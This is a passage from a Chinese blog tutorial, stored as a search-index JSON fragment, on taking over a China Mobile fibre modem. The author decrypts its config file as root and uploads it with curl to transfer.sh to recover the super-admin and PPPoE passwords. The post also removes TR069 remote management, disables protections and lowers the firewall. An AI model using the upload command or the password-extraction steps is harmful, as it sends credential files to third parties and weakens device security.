</p>"},{"location":"9/5/#_8","title":"\u83b7\u53d6\u200b\u8d85\u7ba1\u200b\u5bc6\u7801","text":"<p>\u200b\u56e0\u4e3a\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u4f1a\u200b\u901a\u8fc7\u200b\u4ed6\u200b\u7684\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u597d\u200b\u5728\u200b\u6211\u4eec\u200b\u5728\u200b root \u200b\u7684\u200b shell \u200b\u4ea4\u4e92\u6027\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u89e3\u5bc6\u200b\u51fa\u8d85\u200b\u7ba1\u200b\u7684\u200b\u5bc6\u7801\u200b\uff1a</p> Bash<pre><code># \u200b\u89e3\u5bc6\u200b db_user_cfg.xml \u200b\u914d\u7f6e\u6587\u4ef6\u200b\nsidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml\n\n# \u200b\u5c06\u200b\u89e3\u5bc6\u200b\u540e\u200b\u7684\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u5230\u200b transfer.sh\ncurl -v -k --upload-file /tmp/debug-decry-cfg  https://transfer.sh/debug.xml\n</code></pre> <p>transfer.sh \u200b\u662f\u200b\u7b2c\u4e09\u65b9\u200b\u8fd0\u8d39\u200b\u5546\u200b\u53ef\u80fd\u200b\u6709\u200b\u4e00\u5b9a\u200b\u6cc4\u9732\u200b\u5206\u4eab\u200b\uff0c\u200b\u5982\u679c\u200b\u62c5\u5fc3\u200b\u6570\u636e\u200b\u6cc4\u9732\u200b\u7684\u200b\u5c0f\u4f19\u4f34\u200b\u81ea\u5df1\u200b\u672c\u5730\u200b\u67e5\u770b\u200b\u5373\u53ef\u200b\u3002\u200b\u56fd\u5149\u200b\u6211\u200b\u4e2a\u4eba\u200b\u5efa\u8bae\u200b\u5907\u4efd\u200b\u4e00\u4e0b\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u6211\u4eec\u200b\u540e\u9762\u200b\u6539\u200b\u6865\u63a5\u200b\uff0c\u200b\u5220\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u914d\u7f6e\u200b\u5c31\u200b\u56de\u4e0d\u6765\u200b\u4e86\u200b\u3002</p> <p>curl \u200b\u4e0a\u4f20\u200b\u6210\u529f\u200b\u6216\u200b\u56de\u200b\u8fd4\u56de\u200b\u968f\u673a\u200b\u8def\u5f84\u200b\u7684\u200b URL\uff1a</p> <p> </p> <p>\u200b\u8bbf\u95ee\u200b\u5373\u53ef\u200b\u4e0b\u8f7d\u200b\u6211\u4eec\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u770b\u770b\u200b\u8fd9\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u91cc\u9762\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u4fe1\u606f\u200b\u3002</p> <ul> <li>\u200b\u5149\u732b\u200b\u7684\u200b\u8d85\u7ba1\u200b\u548c\u200b\u666e\u901a\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u4fe1\u606f\u200b\uff1a</li> </ul> <p> </p> <ul> <li>\u200b\u4fdd\u5b58\u200b\u7684\u200b PPPoE \u200b\u62e8\u53f7\u4e0a\u7f51\u200b\u7684\u200b\u4fe1\u606f\u200b</li> </ul> <p> </p> <p>\u200b\u6b64\u65f6\u200b\u56de\u5230\u200b\u4e4b\u524d\u200b\u7684\u200b http://192.168.1.1/ \u200b\u9875\u9762\u200b\uff0c\u200b\u6211\u4eec\u200b\u91cd\u65b0\u200b\u4f7f\u7528\u200b\u83b7\u53d6\u200b\u5230\u200b\u7684\u200b CMCCAdmin \u200b\u7684\u200b\u7528\u6237\u540d\u200b\u548c\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"9/5/#_9","title":"\u5149\u732b\u200b\u8c03\u6559","text":""},{"location":"9/5/#tr069","title":"\u5220\u9664\u200b TR069","text":"<p>\u200b\u56e0\u4e3a\u200b\u79fb\u52a8\u200b\u7684\u200b\u5149\u732b\u200b\u662f\u200b\u901a\u8fc7\u200b TR069 \u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u505a\u200b\u4e00\u4e9b\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5220\u6389\u200b\u5b83\u200b\uff0c\u200b\u4e00\u52b3\u6c38\u9038\u200b\uff0c\u200b\u8fd9\u6837\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u5c31\u200b\u4e00\u76f4\u200b\u662f\u200b\u6211\u4eec\u200b\u89e3\u5bc6\u200b\u51fa\u6765\u200b\u7684\u200b\u6837\u5b50\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0d\u8fc7\u200b\u5982\u679c\u200b\u4e0d\u200b\u5220\u6389\u200b\u8fd9\u4e2a\u200b TR069 \u200b\u7684\u8bdd\u200b\uff0c\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6709\u200b\u5176\u4ed6\u200b\u5947\u6280\u6deb\u5de7\u200b\u7684\u200b\u73a9\u6cd5\u200b\uff1aTR069 \u200b\u5185\u200b\u7f51\u200b\u96a7\u9053\u200b\u3001\u200b\u5f02\u5730\u200b\u7ec4\u7f51\u200b\u3001\u200b\u5185\u200b\u7f51\u200b\u6e17\u900f\u200b\uff1f   \u200b\u53ef\u60dc\u200b\u56fd\u5149\u200b\u660e\u5929\u200b\u8981\u200b\u4e0a\u73ed\u200b\u4e86\u200b\uff0c\u200b\u7cbe\u529b\u200b\u4e0d\u591f\u200b\u7ee7\u7eed\u200b\u6df1\u5165\u200b\u4e86\u200b\uff0cmark \u200b\u4e00\u4e0b\u200b\u540e\u9762\u200b\u6709\u200b\u673a\u4f1a\u200b\u6298\u817e\u200b\u8fd9\u4e2a\u200b\u3002</p>"},{"location":"9/5/#upnp","title":"\u542f\u7528\u200b UPnP","text":"<p>\u200b\u5f00\u542f\u200b UPnP \u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u529f\u80fd\u200b\uff0cUPnP \u200b\u6216\u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u662f\u200b\u4e00\u79cd\u200b\u534f\u8bae\u200b\u96c6\u200b\uff0c\u200b\u5141\u8bb8\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u548c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\uff08\u200b\u4e3b\u8981\u200b\u662f\u200b\u6e38\u620f\u200b\uff09\u200b\u81ea\u52a8\u200b\u8f6c\u53d1\u200b\u7aef\u53e3\u200b\u3002\u200b\u53ef\u4ee5\u200b\u6781\u5927\u200b\u7684\u200b\u6539\u5584\u200b\u6211\u4eec\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u867d\u7136\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5927\u5185\u200b\u7f51\u200b\uff0c\u200b\u4f46\u662f\u200b\u6539\u5584\u200b\u4e00\u70b9\u200b\u662f\u200b\u4e00\u70b9\u200b\u5427\u200b\uff1a</p> <p> </p>"},{"location":"9/5/#qos","title":"\u5173\u95ed\u200b QoS","text":"<p>\u200b\u4e0d\u200b\u9700\u8981\u200b\u5bf9\u200b\u5e26\u5bbd\u200b\u8fdb\u884c\u200b\u9650\u901f\u200b\uff0c\u200b\u800c\u4e14\u200b\u6211\u4eec\u200b\u4e0a\u7f51\u200b\u7684\u200b INTERNET \u200b\u4e1a\u52a1\u200b\u4f18\u5148\u7ea7\u200b\u8fd8\u662f\u200b\u6700\u4f4e\u200b\uff1f\u200b\u8fd9\u200b\u4e0d\u80fd\u200b\u5fcd\u200b\uff01\u200b\u76f4\u63a5\u200b\u5173\u6389\u200b QoS \u200b\u5373\u53ef\u200b\uff0c\u200b\u975e\u5e38\u200b\u7701\u200b\u4e8b\u513f\u200b\uff1a</p> <p> </p>"},{"location":"9/5/#_10","title":"\u9632\u706b\u5899\u200b\u914d\u7f6e","text":"<p>\u200b\u9996\u5148\u200b\u53d6\u6d88\u200b\u6240\u6709\u200b\u5b89\u5168\u200b\u9632\u62a4\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u5c06\u200b\u9632\u706b\u5899\u200b\u7b49\u7ea7\u200b\u8c03\u5230\u200b\u4f4e\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u6837\u200b\u5728\u200b\u732b\u200b\u4e0b\u9762\u200b\u7684\u200b\u673a\u5668\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u83b7\u53d6\u200b\u5230\u200b IPv6 \u200b\u516c\u7f51\u200b\u5730\u5740\u200b\uff0c\u200b\u7136\u540e\u200b Python \u200b\u542f\u52a8\u200b\u4e2a\u200b  Web \u200b\u670d\u52a1\u200b\u9a8c\u8bc1\u200b\u4e00\u4e0b\u200b\uff1a</p> Bash<pre><code>python3 -m http.server --bind ::\n</code></pre> <p>\u200b\u624b\u673a\u200b\u4f7f\u7528\u200b SIM \u200b\u8fd0\u8425\u5546\u200b\u7f51\u7edc\u200b\u4e5f\u200b\u6210\u529f\u200b\u8bbf\u95ee\u200b\uff1a</p> <p> </p>"},{"location":"9/5/#_11","title":"\u5149\u732b\u200b\u6865\u63a5","text":"<p>\u200b\u5176\u5b9e\u200b\u5982\u679c\u200b\u5149\u732b\u200b\u6865\u63a5\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e4b\u524d\u200b\u7684\u200b\u300c\u200b\u5149\u732b\u200b\u8c03\u6559\u200b\u300d\u200b\u90e8\u5206\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u65e0\u6240\u8c13\u200b\u4e86\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u6837\u200b\u76f8\u5f53\u4e8e\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u8def\u7531\u5668\u200b\u62e8\u53f7\u200b\u4e86\u200b\u3002\u200b\u5149\u732b\u200b\u6865\u63a5\u200b\u7684\u200b\u597d\u5904\u200b\uff1a</p> <ol> <li>\u200b\u6539\u5584\u200b NAT \u200b\u7c7b\u578b\u200b\uff08\u200b\u4e2d\u56fd\u7535\u4fe1\u200b\u6709\u200b\u516c\u7f51\u200b IPv4 \u200b\u7684\u8bdd\u200b\uff0c\u200b\u751a\u81f3\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8def\u7531\u5668\u200b\u62e8\u53f7\u200b\u83b7\u53d6\u200b\u516c\u7f51\u200b IPv4\uff09</li> <li>\u200b\u63d0\u9ad8\u200b\u7f51\u7edc\u200b\u4f53\u9a8c\u200b\uff0c\u200b\u51cf\u8f7b\u200b\u5149\u732b\u200b\u8d1f\u62c5\u200b\uff0c\u200b\u538b\u529b\u200b\u8f6c\u79fb\u200b\u5230\u200b\u4e86\u200b\u8def\u7531\u5668\u200b</li> <li>\u200b\u65b9\u4fbf\u200b\u7528\u6237\u200b\u81ea\u5b9a\u4e49\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5149\u732b\u200b\u7684\u200b\u5b98\u65b9\u200b\u9650\u5236\u200b\u6709\u70b9\u200b\u591a\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4ea4\u7ed9\u200b\u8def\u7531\u5668\u200b\u7684\u8bdd\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f88\u200b\u7075\u6d3b\u200b\u914d\u7f6e\u200b</li> </ol> <p>\u200b\u800c\u4e14\u200b\u636e\u8bf4\u200b\u6c5f\u82cf\u200b\u5357\u4eac\u200b\u79fb\u52a8\u200b\u53ef\u4ee5\u200b\u6700\u200b\u591a\u200b 4 \u200b\u62e8\u200b\uff0c\u200b\u90a3\u200b\u4e0d\u200b\u5c31\u200b\u7f8e\u6ecb\u6ecb\u200b\u4e86\u200b\uff0c\u200b\u76f4\u63a5\u200b\u51c6\u5907\u200b\u5f00\u59cb\u200b\u6865\u63a5\u200b\u3002</p>"},{"location":"9/5/#_12","title":"\u8bb0\u5f55\u200b\u914d\u7f6e","text":"<p>\u200b\u56e0\u4e3a\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u4fee\u6539\u200b\u5df2\u6709\u200b\u7684\u200b\u7f51\u7edc\u200b\u4e3a\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u5220\u6389\u200b\u73b0\u6709\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u7136\u540e\u200b\u65b0\u5efa\u200b1\u200b\u4e2a\u200b\u8fde\u63a5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b\u4e4b\u524d\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u91cd\u70b9\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b VLAN \u200b\u6a21\u5f0f\u200b\u548c\u200b ID\uff1a</p> <p> </p>"},{"location":"9/5/#_13","title":"\u65b0\u5efa\u200b\u8fde\u63a5","text":"<p>\u200b\u65b0\u5efa\u200b 1 \u200b\u4e2a\u200b WAN \u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e3b\u8981\u200b\u914d\u7f6e\u200b\u6284\u200b\u4e00\u4e0b\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u7684\u200b\u5373\u53ef\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u56fd\u5149\u200b\u7684\u200b\u914d\u7f6e\u200b\u8be6\u60c5\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6c5f\u82cf\u200b\u79fb\u52a8\u200b\u6700\u5927\u200b\u652f\u6301\u200b 4 \u200b\u62e8\u200b\uff0c\u200b\u6b63\u597d\u200b\u4e5f\u200b\u6709\u200b 4 \u200b\u4e2a\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u76f4\u63a5\u200b\u52fe\u9009\u200b\u8fd9\u200b\u51e0\u4e2a\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u5177\u4f53\u200b\u914d\u7f6e\u200b\u7ec6\u8282\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u786e\u4fdd\u200b\u5220\u6389\u200b\u4e4b\u524d\u200b\u7684\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u53ea\u6709\u200b 1 \u200b\u4e2a\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u914d\u7f6e\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u751f\u6548\u200b\u7684\u8bdd\u200b\uff0c\u200b\u8bb0\u5f97\u200b\u91cd\u542f\u200b\u4e00\u4e0b\u200b\u5149\u732b\u200b\u3002  </p>"},{"location":"9/5/#_14","title":"\u62e8\u53f7\u4e0a\u7f51","text":"<p>\u200b\u6865\u63a5\u200b\u6210\u529f\u200b\u540e\u200b\uff0cMBP \u200b\u76f4\u63a5\u200b\u7f51\u7ebf\u200b\u63d2\u5149\u200b\u732b\u200b\u4e0a\u200b\uff0c\u200b\u5373\u53ef\u200b\u62e8\u53f7\u4e0a\u7f51\u200b\u6210\u529f\u200b\uff1a</p> <p> </p> <p>\u200b\u56e0\u4e3a\u200b\u5149\u732b\u200b\u6539\u200b\u4e86\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u5728\u200b\u8def\u7531\u5668\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u62e8\u53f7\u4e0a\u7f51\u200b\uff1a</p> <p> </p> <p>\u200b\u7f8e\u6ecb\u6ecb\u200b\uff0c\u200b\u5f00\u59cb\u200b\u5c3d\u60c5\u200b\u4eab\u53d7\u200b\u4f60\u200b\u7684\u200b\u7f51\u7edc\u200b\u5427\u200b~~~</p>"},{"location":"9/5/#_15","title":"\u5c0f\u200b\u4f17\u200b\u573a\u666f","text":"<p>\u200b\u80af\u5b9a\u200b\u4f1a\u200b\u6709\u200b\u7f51\u53cb\u200b\u597d\u5947\u200b\u5149\u732b\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b\u6865\u63a5\u200b\u548c\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u5417\u200b\uff1f\u200b\u90a3\u200b\u80af\u5b9a\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7684\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u8fd9\u6837\u200b\u7684\u200b\u573a\u666f\u200b\u975e\u5e38\u5c11\u200b\uff0c\u200b\u4f46\u662f\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u7684\u200b\u3002</p> <p>\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u5199\u200b\u8fd9\u200b\u7bc7\u6587\u7ae0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f4f\u200b\u7684\u200b\u8fd8\u662f\u200b LOFT \u200b\u516c\u5bd3\u200b\uff0c\u200b\u548c\u200b\u697c\u4e0a\u200b\u7684\u200b\u5c0f\u54e5\u200b\u5171\u7528\u200b 1 \u200b\u4e2a\u5149\u200b\u732b\u200b\u3002\u200b\u6211\u200b\u5982\u679c\u200b\u6539\u4e86\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u60f3\u200b\u8ba9\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u65e0\u611f\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ea\u80fd\u200b\u5728\u200b\u5149\u732b\u200b\u4e0b\u200b\u5916\u63a5\u200b 1 \u200b\u4e2a\u200b\u8def\u7531\u5668\u200b\uff0c\u200b\u7136\u540e\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u7684\u200b\u7f51\u7ebf\u200b\u63d2\u200b\u8def\u7531\u5668\u200b\u4e86\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u4e5f\u200b\u592a\u200b\u5f20\u626c\u200b\u548c\u200b\u4e0d\u200b\u4f18\u96c5\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5355\u72ec\u200b\u7ed9\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u914d\u7f6e\u200b 1 \u200b\u4e2a\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5176\u4ed6\u200b\u5168\u90e8\u200b\u8d70\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u3002</p> <p>\u200b\u5176\u5b9e\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u5c31\u662f\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u7ed1\u5b9a\u200b 2\u30013\u30014 \u200b\u7aef\u53e3\u200b\uff1a</p> <p> </p> <p>\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u7ed1\u5b9a\u200b 1 \u200b\u7aef\u53e3\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u6d4b\u8bd5\u200b\u5747\u200b\u6b63\u5e38\u200b\uff0c\u200b\u771f\u7684\u200b\u592a\u200b\u4f18\u96c5\u200b\u4e86\u200b\uff0c\u200b\u8fd8\u200b\u8282\u7701\u200b\u4e86\u200b 1 \u200b\u4e2a\u200b\u8def\u7531\u5668\u200b\u7684\u200b\u94b1\u200b\uff1a</p> <p> </p>"}]}